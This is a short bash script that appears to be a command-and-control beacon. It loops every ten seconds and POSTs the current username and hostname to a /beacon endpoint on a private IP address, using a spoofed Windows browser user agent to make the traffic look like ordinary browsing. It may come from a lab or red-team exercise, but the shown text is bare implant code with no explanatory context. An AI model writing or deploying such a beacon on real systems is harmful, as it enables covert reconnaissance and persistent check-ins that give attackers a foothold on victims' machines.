#!/bin/bash
while true; do
    curl -s -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
         -X POST -d "user=$(whoami)&host=$(hostname)" \
         http://10.211.55.24:8000/beacon
    echo "[$(date)] Beacon sent"
    sleep 10
done
